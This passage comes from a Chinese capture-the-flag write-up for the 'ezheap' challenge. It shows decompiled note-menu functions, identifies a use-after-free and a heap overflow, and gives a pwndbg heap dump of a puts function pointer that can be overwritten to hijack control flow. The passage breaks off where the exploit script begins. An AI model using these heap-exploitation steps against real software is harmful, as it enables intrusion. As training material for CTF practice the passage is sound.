+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>detele 函数</p><a id=more></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1> 1</a>
+</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2> 2</a>
+</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3> 3</a>
+</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4> 4</a>
+</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5> 5</a>
+</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6> 6</a>
+</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7> 7</a>
+</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8> 8</a>
+</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9> 9</a>
+</span><span class=lnt id=hl-2-10><a class=lnlinks href=#hl-2-10>10</a>
+</span><span class=lnt id=hl-2-11><a class=lnlinks href=#hl-2-11>11</a>
+</span><span class=lnt id=hl-2-12><a class=lnlinks href=#hl-2-12>12</a>
+</span><span class=lnt id=hl-2-13><a class=lnlinks href=#hl-2-13>13</a>
+</span><span class=lnt id=hl-2-14><a class=lnlinks href=#hl-2-14>14</a>
+</span><span class=lnt id=hl-2-15><a class=lnlinks href=#hl-2-15>15</a>
+</span><span class=lnt id=hl-2-16><a class=lnlinks href=#hl-2-16>16</a>
+</span><span class=lnt id=hl-2-17><a class=lnlinks href=#hl-2-17>17</a>
+</span><span class=lnt id=hl-2-18><a class=lnlinks href=#hl-2-18>18</a>
+</span><span class=lnt id=hl-2-19><a class=lnlinks href=#hl-2-19>19</a>
+</span><span class=lnt id=hl-2-20><a class=lnlinks href=#hl-2-20>20</a>
+</span><span class=lnt id=hl-2-21><a class=lnlinks href=#hl-2-21>21</a>
+</span><span class=lnt id=hl-2-22><a class=lnlinks href=#hl-2-22>22</a>
+</span><span class=lnt id=hl-2-23><a class=lnlinks href=#hl-2-23>23</a>
+</span><span class=lnt id=hl-2-24><a class=lnlinks href=#hl-2-24>24</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_QWORD</span> <span class=o>*</span><span class=nf>delete</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>_QWORD</span> <span class=o>*</span><span class=n>result</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-4h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Input your idx:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>&lt;=</span> <span class=mh>0x10</span> <span class=o>&amp;&amp;</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>24LL</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=n>sizelist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>24LL</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>heaplist</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Error idx!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>free 之后没有置空 heaplist[v1] 指针，存在 UAF 漏洞</p><p>show 函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1> 1</a>
+</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2> 2</a>
+</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3> 3</a>
+</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4> 4</a>
+</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5> 5</a>
+</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6> 6</a>
+</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7> 7</a>
+</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8> 8</a>
+</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9> 9</a>
+</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10>10</a>
+</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11>11</a>
+</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12>12</a>
+</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13>13</a>
+</span><span class=lnt id=hl-3-14><a class=lnlinks href=#hl-3-14>14</a>
+</span><span class=lnt id=hl-3-15><a class=lnlinks href=#hl-3-15>15</a>
+</span><span class=lnt id=hl-3-16><a class=lnlinks href=#hl-3-16>16</a>
+</span><span class=lnt id=hl-3-17><a class=lnlinks href=#hl-3-17>17</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>show</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>signed</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-4h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Input your idx:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v1</span> <span class=o>&lt;</span> <span class=mh>0x10</span> <span class=o>&amp;&amp;</span> <span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>))(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>32LL</span><span class=p>))(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>))(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>32LL</span><span class=p>))(</span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Error idx!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>edit 函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1> 1</a>
+</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2> 2</a>
+</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3> 3</a>
+</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4> 4</a>
+</span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5> 5</a>
+</span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6> 6</a>
+</span><span class=lnt id=hl-4-7><a class=lnlinks href=#hl-4-7> 7</a>
+</span><span class=lnt id=hl-4-8><a class=lnlinks href=#hl-4-8> 8</a>
+</span><span class=lnt id=hl-4-9><a class=lnlinks href=#hl-4-9> 9</a>
+</span><span class=lnt id=hl-4-10><a class=lnlinks href=#hl-4-10>10</a>
+</span><span class=lnt id=hl-4-11><a class=lnlinks href=#hl-4-11>11</a>
+</span><span class=lnt id=hl-4-12><a class=lnlinks href=#hl-4-12>12</a>
+</span><span class=lnt id=hl-4-13><a class=lnlinks href=#hl-4-13>13</a>
+</span><span class=lnt id=hl-4-14><a class=lnlinks href=#hl-4-14>14</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>edit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// [rsp+8h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>nbytes</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-4h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Input your idx:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Size:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>nbytes</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>&lt;=</span> <span class=mh>0x10</span> <span class=o>&amp;&amp;</span> <span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=n>nbytes</span> <span class=o>&lt;=</span> <span class=mh>0x100</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>),</span> <span class=n>nbytes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Error idx!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>我们可以控制 nbytes 的大小，导致堆溢出</p><hr><p>动态调试来查看 heap 内存布局</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1> 1</a>
+</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2> 2</a>
+</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3> 3</a>
+</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4> 4</a>
+</span><span class=lnt id=hl-5-5><a class=lnlinks href=#hl-5-5> 5</a>
+</span><span class=lnt id=hl-5-6><a class=lnlinks href=#hl-5-6> 6</a>
+</span><span class=lnt id=hl-5-7><a class=lnlinks href=#hl-5-7> 7</a>
+</span><span class=lnt id=hl-5-8><a class=lnlinks href=#hl-5-8> 8</a>
+</span><span class=lnt id=hl-5-9><a class=lnlinks href=#hl-5-9> 9</a>
+</span><span class=lnt id=hl-5-10><a class=lnlinks href=#hl-5-10>10</a>
+</span><span class=lnt id=hl-5-11><a class=lnlinks href=#hl-5-11>11</a>
+</span><span class=lnt id=hl-5-12><a class=lnlinks href=#hl-5-12>12</a>
+</span><span class=lnt id=hl-5-13><a class=lnlinks href=#hl-5-13>13</a>
+</span><span class=lnt id=hl-5-14><a class=lnlinks href=#hl-5-14>14</a>
+</span><span class=lnt id=hl-5-15><a class=lnlinks href=#hl-5-15>15</a>
+</span><span class=lnt id=hl-5-16><a class=lnlinks href=#hl-5-16>16</a>
+</span><span class=lnt id=hl-5-17><a class=lnlinks href=#hl-5-17>17</a>
+</span><span class=lnt id=hl-5-18><a class=lnlinks href=#hl-5-18>18</a>
+</span><span class=lnt id=hl-5-19><a class=lnlinks href=#hl-5-19>19</a>
+</span><span class=lnt id=hl-5-20><a class=lnlinks href=#hl-5-20>20</a>
+</span><span class=lnt id=hl-5-21><a class=lnlinks href=#hl-5-21>21</a>
+</span><span class=lnt id=hl-5-22><a class=lnlinks href=#hl-5-22>22</a>
+</span><span class=lnt id=hl-5-23><a class=lnlinks href=#hl-5-23>23</a>
+</span><span class=lnt id=hl-5-24><a class=lnlinks href=#hl-5-24>24</a>
+</span><span class=lnt id=hl-5-25><a class=lnlinks href=#hl-5-25>25</a>
+</span><span class=lnt id=hl-5-26><a class=lnlinks href=#hl-5-26>26</a>
+</span><span class=lnt id=hl-5-27><a class=lnlinks href=#hl-5-27>27</a>
+</span><span class=lnt id=hl-5-28><a class=lnlinks href=#hl-5-28>28</a>
+</span><span class=lnt id=hl-5-29><a class=lnlinks href=#hl-5-29>29</a>
+</span><span class=lnt id=hl-5-30><a class=lnlinks href=#hl-5-30>30</a>
+</span><span class=lnt id=hl-5-31><a class=lnlinks href=#hl-5-31>31</a>
+</span><span class=lnt id=hl-5-32><a class=lnlinks href=#hl-5-32>32</a>
+</span><span class=lnt id=hl-5-33><a class=lnlinks href=#hl-5-33>33</a>
+</span><span class=lnt id=hl-5-34><a class=lnlinks href=#hl-5-34>34</a>
+</span><span class=lnt id=hl-5-35><a class=lnlinks href=#hl-5-35>35</a>
+</span><span class=lnt id=hl-5-36><a class=lnlinks href=#hl-5-36>36</a>
+</span><span class=lnt id=hl-5-37><a class=lnlinks href=#hl-5-37>37</a>
+</span><span class=lnt id=hl-5-38><a class=lnlinks href=#hl-5-38>38</a>
+</span><span class=lnt id=hl-5-39><a class=lnlinks href=#hl-5-39>39</a>
+</span><span class=lnt id=hl-5-40><a class=lnlinks href=#hl-5-40>40</a>
+</span><span class=lnt id=hl-5-41><a class=lnlinks href=#hl-5-41>41</a>
+</span><span class=lnt id=hl-5-42><a class=lnlinks href=#hl-5-42>42</a>
+</span><span class=lnt id=hl-5-43><a class=lnlinks href=#hl-5-43>43</a>
+</span><span class=lnt id=hl-5-44><a class=lnlinks href=#hl-5-44>44</a>
+</span><span class=lnt id=hl-5-45><a class=lnlinks href=#hl-5-45>45</a>
+</span><span class=lnt id=hl-5-46><a class=lnlinks href=#hl-5-46>46</a>
+</span><span class=lnt id=hl-5-47><a class=lnlinks href=#hl-5-47>47</a>
+</span><span class=lnt id=hl-5-48><a class=lnlinks href=#hl-5-48>48</a>
+</span><span class=lnt id=hl-5-49><a class=lnlinks href=#hl-5-49>49</a>
+</span><span class=lnt id=hl-5-50><a class=lnlinks href=#hl-5-50>50</a>
+</span><span class=lnt id=hl-5-51><a class=lnlinks href=#hl-5-51>51</a>
+</span><span class=lnt id=hl-5-52><a class=lnlinks href=#hl-5-52>52</a>
+</span><span class=lnt id=hl-5-53><a class=lnlinks href=#hl-5-53>53</a>
+</span><span class=lnt id=hl-5-54><a class=lnlinks href=#hl-5-54>54</a>
+</span><span class=lnt id=hl-5-55><a class=lnlinks href=#hl-5-55>55</a>
+</span><span class=lnt id=hl-5-56><a class=lnlinks href=#hl-5-56>56</a>
+</span><span class=lnt id=hl-5-57><a class=lnlinks href=#hl-5-57>57</a>
+</span><span class=lnt id=hl-5-58><a class=lnlinks href=#hl-5-58>58</a>
+</span><span class=lnt id=hl-5-59><a class=lnlinks href=#hl-5-59>59</a>
+</span><span class=lnt id=hl-5-60><a class=lnlinks href=#hl-5-60>60</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; r
+</span></span><span class=line><span class=cl>Starting program: /home/lhon901/Downloads/ezheap/ezheap
+</span></span><span class=line><span class=cl>Easy Note.
+</span></span><span class=line><span class=cl>1.Add.
+</span></span><span class=line><span class=cl>2.Delete.
+</span></span><span class=line><span class=cl>3.Show.
+</span></span><span class=line><span class=cl>4.Edit.
+</span></span><span class=line><span class=cl>Choice:
+</span></span><span class=line><span class=cl><span class=m>1</span>
+</span></span><span class=line><span class=cl>Input your idx:
+</span></span><span class=line><span class=cl><span class=m>0</span>
+</span></span><span class=line><span class=cl>Size:
+</span></span><span class=line><span class=cl><span class=m>16</span>
+</span></span><span class=line><span class=cl>Name:
+</span></span><span class=line><span class=cl>aaaa
+</span></span><span class=line><span class=cl>Content:
+</span></span><span class=line><span class=cl>bbbb
+</span></span><span class=line><span class=cl>Done!
+</span></span><span class=line><span class=cl>1.Add.
+</span></span><span class=line><span class=cl>2.Delete.
+</span></span><span class=line><span class=cl>3.Show.
+</span></span><span class=line><span class=cl>4.Edit.
+</span></span><span class=line><span class=cl>Choice:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pwndbg&gt; heap
+</span></span><span class=line><span class=cl>pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
+</span></span><span class=line><span class=cl>This might not work in all cases. Use <span class=sb>`</span><span class=nb>help</span> <span class=nb>set</span> resolve-heap-via-heuristic<span class=sb>`</span> <span class=k>for</span> more details.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Allocated chunk <span class=p>|</span> PREV_INUSE
+</span></span><span class=line><span class=cl>Addr: 0x55555555b000
+</span></span><span class=line><span class=cl>Size: 0x30 <span class=o>(</span>with flag bits: 0x31<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Allocated chunk <span class=p>|</span> PREV_INUSE
+</span></span><span class=line><span class=cl>Addr: 0x55555555b030
+</span></span><span class=line><span class=cl>Size: 0x20 <span class=o>(</span>with flag bits: 0x21<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Top chunk <span class=p>|</span> PREV_INUSE
+</span></span><span class=line><span class=cl>Addr: 0x55555555b050
+</span></span><span class=line><span class=cl>Size: 0x20fb0 <span class=o>(</span>with flag bits: 0x20fb1<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pwndbg&gt; x/20gx 0x55555555b000
+</span></span><span class=line><span class=cl>0x55555555b000: 0x0000000000000000 0x0000000000000031
+</span></span><span class=line><span class=cl>0x55555555b010: 0x0000000a61616161 0x0000000000000000
+</span></span><span class=line><span class=cl>0x55555555b020: 0x000055555555b040 0x0000000000000001
+</span></span><span class=line><span class=cl>0x55555555b030: 0x00007ffff786f6a0 0x0000000000000021
+</span></span><span class=line><span class=cl>0x55555555b040: 0x0000000a62626262 0x0000000000000000
+</span></span><span class=line><span class=cl>0x55555555b050: 0x0000000000000000 0x0000000000020fb1
+</span></span><span class=line><span class=cl>0x55555555b060: 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x55555555b070: 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x55555555b080: 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x55555555b090: 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>pwndbg&gt; tele 0x00007ffff786f6a0
+</span></span><span class=line><span class=cl>00:0000│  0x7ffff786f6a0 <span class=o>(</span>puts<span class=o>)</span> ◂— push r12
+</span></span><span class=line><span class=cl>01:0008│  0x7ffff786f6a8 <span class=o>(</span>puts+8<span class=o>)</span> ◂— hlt
+</span></span><span class=line><span class=cl>02:0010│  0x7ffff786f6b0 <span class=o>(</span>puts+16<span class=o>)</span> ◂— 0x458bc38948003560 /* <span class=s1>&#39;`5&#39;</span> */
+</span></span><span class=line><span class=cl>03:0018│  0x7ffff786f6b8 <span class=o>(</span>puts+24<span class=o>)</span> ◂— add byte ptr <span class=o>[</span>rax - 0x77<span class=o>]</span>, cl
+</span></span><span class=line><span class=cl>04:0020│  0x7ffff786f6c0 <span class=o>(</span>puts+32<span class=o>)</span> ◂— add byte ptr <span class=o>[</span>rbp + 0x61<span class=o>]</span>, dh
+</span></span><span class=line><span class=cl>05:0028│  0x7ffff786f6c8 <span class=o>(</span>puts+40<span class=o>)</span> ◂— add byte ptr <span class=o>[</span>rax<span class=o>]</span>, al
+</span></span><span class=line><span class=cl>06:0030│  0x7ffff786f6d0 <span class=o>(</span>puts+48<span class=o>)</span> ◂— add byte ptr <span class=o>[</span>rax<span class=o>]</span>, al
+</span></span><span class=line><span class=cl>07:0038│  0x7ffff786f6d8 <span class=o>(</span>puts+56<span class=o>)</span> ◂— <span class=nb>test</span> byte ptr <span class=o>[</span>rbx<span class=o>]</span>, bl</span></span></code></pre></td></tr></table></div></div><p>0x55555555b000 中存储这我们刚才 add 的数据, 0x55555555b000 + 0x20 处存储这 content 的地址，edit 函数就是更具这个地址来修改内容的<br>我们可以创建两个节点, 第一个节点的 content 会和第二个节点相连，这样我们就能修改 0x55555555b000 + 0x30 处存放的函数地址了, 这里原本应该储存 puts 的地址</p><p><a href=https://www.nssctf.cn/note/set/2776 title=wp rel="noopener external nofollow noreferrer" target=_blank class=exturl>wp
+<i class="fa fa-external-link-alt"></i>
+</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1> 1</a>
+</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2> 2</a>
+</span><span class=lnt id=hl-6-3><a class=lnlinks href=#hl-6-3> 3</a>
+</span><span class=lnt id=hl-6-4><a class=lnlinks href=#hl-6-4> 4</a>
+</span><span class=lnt id=hl-6-5><a class=lnlinks href=#hl-6-5> 5</a>
+</span><span class=lnt id=hl-6-6><a class=lnlinks href=#hl-6-6> 6</a>
+</span><span class=lnt id=hl-6-7><a class=lnlinks href=#hl-6-7> 7</a>
+</span><span class=lnt id=hl-6-8><a class=lnlinks href=#hl-6-8> 8</a>
+</span><span class=lnt id=hl-6-9><a class=lnlinks href=#hl-6-9> 9</a>
+</span><span class=lnt id=hl-6-10><a class=lnlinks href=#hl-6-10>10</a>
+</span><span class=lnt id=hl-6-11><a class=lnlinks href=#hl-6-11>11</a>
+</span><span class=lnt id=hl-6-12><a class=lnlinks href=#hl-6-12>12</a>
+</span><span class=lnt id=hl-6-13><a class=lnlinks href=#hl-6-13>13</a>
+</span><span class=lnt id=hl-6-14><a class=lnlinks href=#hl-6-14>14</a>
+</span><span class=lnt id=hl-6-15><a class=lnlinks href=#hl-6-15>15</a>
+</span><span class=lnt id=hl-6-16><a class=lnlinks href=#hl-6-16>16</a>
+</span><span class=lnt id=hl-6-17><a class=lnlinks href=#hl-6-17>17</a>
+</span><span class=lnt id=hl-6-18><a class=lnlinks href=#hl-6-18>18</a>
+</span><span class=lnt id=hl-6-19><a class=lnlinks href=#hl-6-19>19</a>
+</span><span class=lnt id=hl-6-20><a class=lnlinks href=#hl-6-20>20</a>
+</span><span class=lnt id=hl-6-21><a class=lnlinks href=#hl-6-21>21</a>
+</span><span class=lnt id=hl-6-22><a class=lnlinks href=#hl-6-22>22</a>
+</span><span class=lnt id=hl-6-23><a class=lnlinks href=#hl-6-23>23</a>
+</span><span class=lnt id=hl-6-24><a class=lnlinks href=#hl-6-24>24</a>
+</span><span class=lnt id=hl-6-25><a class=lnlinks href=#hl-6-25>25</a>
+</span><span class=lnt id=hl-6-26><a class=lnlinks href=#hl-6-26>26</a>
+</span><span class=lnt id=hl-6-27><a class=lnlinks href=#hl-6-27>27</a>
+</span><span class=lnt id=hl-6-28><a class=lnlinks href=#hl-6-28>28</a>
+</span><span class=lnt id=hl-6-29><a class=lnlinks href=#hl-6-29>29</a>
+</span><span class=lnt id=hl-6-30><a class=lnlinks href=#hl-6-30>30</a>
+</span><span class=lnt id=hl-6-31><a class=lnlinks href=#hl-6-31>31</a>
+</span><span class=lnt id=hl-6-32><a class=lnlinks href=#hl-6-32>32</a>
+</span><span class=lnt id=hl-6-33><a class=lnlinks href=#hl-6-33>33</a>
+</span><span class=lnt id=hl-6-34><a class=lnlinks href=#hl-6-34>34</a>
+</span><span class=lnt id=hl-6-35><a class=lnlinks href=#hl-6-35>35</a>
+</span><span class=lnt id=hl-6-36><a class=lnlinks href=#hl-6-36>36</a>
+</span><span class=lnt id=hl-6-37><a class=lnlinks href=#hl-6-37>37</a>
+</span><span class=lnt id=hl-6-38><a class=lnlinks href=#hl-6-38>38</a>
+</span><span class=lnt id=hl-6-39><a class=lnlinks href=#hl-6-39>39</a>
+</span><span class=lnt id=hl-6-40><a class=lnlinks href=#hl-6-40>40</a>
+</span><span class=lnt id=hl-6-41><a class=lnlinks href=#hl-6-41>41</a>
+</span><span class=lnt id=hl-6-42><a class=lnlinks href=#hl-6-42>42</a>
+</span><span class=lnt id=hl-6-43><a class=lnlinks href=#hl-6-43>43</a>
+</span><span class=lnt id=hl-6-44><a class=lnlinks href=#hl-6-44>44</a>
+</span><span class=lnt id=hl-6-45><a class=lnlinks href=#hl-6-45>45</a>
+</span><span class=lnt id=hl-6-46><a class=lnlinks href=#hl-6-46>46</a>
+</span><span class=lnt id=hl-6-47><a class=lnlinks href=#hl-6-47>47</a>
+</span><span class=lnt id=hl-6-48><a class=lnlinks href=#hl-6-48>48</a>
+</span><span class=lnt id=hl-6-49><a class=lnlinks href=#hl-6-49>49</a>
+</span><span class=lnt id=hl-6-50><a class=lnlinks href=#hl-6-50>50</a>
+</span><span class=lnt id=hl-6-51><a class=lnlinks href=#hl-6-51>51</a>
+</span><span class=lnt id=hl-6-52><a class=lnlinks href=#hl-6-52>52</a>
+</span><span class=lnt id=hl-6-53><a class=lnlinks href=#hl-6-53>53</a>
+</span><span class=lnt id=hl-6-54><a class=lnlinks href=#hl-6-54>54</a>
+</span><span class=lnt id=hl-6-55><a class=lnlinks href=#hl-6-55>55</a>
+</span><span class=lnt id=hl-6-56><a class=lnlinks href=#hl-6-56>56</a>
